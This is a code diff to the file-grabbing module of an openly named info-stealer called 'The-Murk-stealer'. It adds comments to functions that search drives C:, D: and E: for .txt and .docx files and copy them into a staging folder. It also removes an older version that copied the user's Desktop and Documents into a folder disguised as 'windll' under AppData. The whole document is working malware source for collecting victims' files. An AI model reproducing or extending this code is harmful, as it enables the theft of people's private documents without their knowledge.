@@ -10,12 +10,19 @@
 #             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
 #-----------------------------------------------------------------------------#
 
+
+"""
+All imports
+"""
 import os
 import shutil
 import pathlib
 import os.path
 
 
+"""
+Function for copy .docx files
+"""
 def CopyDOCX(flist, path, count):
     for i in range (len(flist)):
         count+=1
@@ -31,7 +38,9 @@ def CopyDOCX(flist, path, count):
 
 
 
-
+"""
+Function for copy .txt files
+"""
 def CopyTXT(flist, path, count):
     for i in range (len(flist)):
         count+=1
@@ -45,6 +54,11 @@ def CopyTXT(flist, path, count):
     print("done")
     return count
 
+
+
+"""
+main function
+"""
 def Grab():
     os.chdir("C:")
     try:
@@ -54,6 +68,9 @@ def Grab():
         except:
             pass
         try:
+            """
+            paths for search
+            """
             fileDir = r"C:"
             fileDir1 = r"D:"
             fileDir2 = r"E:"
@@ -62,12 +79,18 @@ def Grab():
             txtCounter = 0
             docxCounter = 0
             print("fg on")
+            """
+            get all paths to files
+            """
             filesTXT_С = list(str(_) for _ in pathlib.Path(fileDir).glob(fileExt))
             filesDOCX_С = list(str(_) for _ in pathlib.Path(fileDir).glob(fileExt1))
             filesTXT_D = list(str(_) for _ in pathlib.Path(fileDir1).glob(fileExt))
             filesDOCX_D = list(str(_) for _ in pathlib.Path(fileDir1).glob(fileExt1))
             filesTXT_E = list(str(_) for _ in pathlib.Path(fileDir2).glob(fileExt))
             filesDOCX_E = list(str(_) for _ in pathlib.Path(fileDir2).glob(fileExt1))
+            """
+            copy files
+            """
             try:
                txtCounter= CopyTXT(filesTXT_С,mainPath,txtCounter)
             except Exception as e:
@@ -97,30 +120,4 @@ def Grab():
     except Exception as e:
         print(e)
 
-
-'''
-def Grab():
-    try:
-        mainPath = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
-        try:
-            os.makedirs(rf'{mainPath}\windll\File-Grubber')
-        except:
-            pass
-        try:
-            desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
-            documents = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Documents')
-            try:
-                shutil.copytree(desktop ,rf'{mainPath}\windll\File-Grubber\folder_A')
-            except Exception as e:
-                print(e)
-            try:
-                shutil.copytree(documents,rf'{mainPath}\windll\File-Grubber\folder_B')
-            except Exception as e:
-                print(e)
-
-        except Exception as e:
-            print(e)
-    except:
-        pass
-'''
 
